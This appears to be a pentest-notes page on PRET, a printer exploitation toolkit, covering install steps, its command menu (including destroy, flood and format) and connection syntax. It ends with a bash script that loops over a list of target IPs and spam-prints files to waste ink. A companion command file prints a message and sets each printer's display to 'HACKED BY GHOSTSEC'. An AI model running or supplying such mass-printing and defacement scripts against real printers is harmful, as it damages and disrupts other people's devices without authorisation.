# PRET

## 01 - Setup

### 1.1 - Dependencies

```
$ sudo apt install -y python3-colorama python3-pysnmp4 imagemagick ghostscript
```

### 1.2 - Install PRET

```
$ git clone https://github.com/RUB-NDS/PRET
```

## 02 - Help Menu

```
$ ./pret.py <printer_target_IP> pjl

<printer_target_IP>:/> help

Available commands (type help <topic>):
=======================================
append  delete    edit    free  info    mkdir      printenv  set        unlock
cat     destroy   env     fuzz  load    nvram      put       site       version
cd      df        exit    get   lock    offline    pwd       status
chvol   disable   find    help  loop    open       reset     timeout
close   discover  flood   hold  ls      pagecount  restart   touch
debug   display   format  id    mirror  print      selftest  traversal
```

## 03 - Usage

In this case we are connecting to the printer that is a PostScript printer language.

```
$ ./pret.py <IP> ps
```

Lastly you can connect to local USB printers.

```
$ ./pret.py /dev/usb/lp0 pjl
```

### 3.1 - Automated

A short script to keep spamming by printing files to waste the inks.

```bash
#!/bin/bash

ips="${1}"
filename="${2}"

while read -r line
do
    ip="${line}"
    ./pret.py ${ip} pjl -q -i "${filename}"
done < "${ips}"
```

```
$ cat > pret_commands.txt << EOF
print ./message-by-ghostsec.txt
display "HACKED BY GHOSTSEC"
quit
EOF

$ chmod +x spam_print.sh

$ ./spam_print.sh ip_targets.txt pret_commands.txt
```

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures Phases/A - Information Gathering/0x02 - Active Fingerprinting/Network Ports/Internet of Things/Printers|Active Fingerprinting: Printers]]

### Github

- [PRET](https://github.com/RUB-NDS/PRET)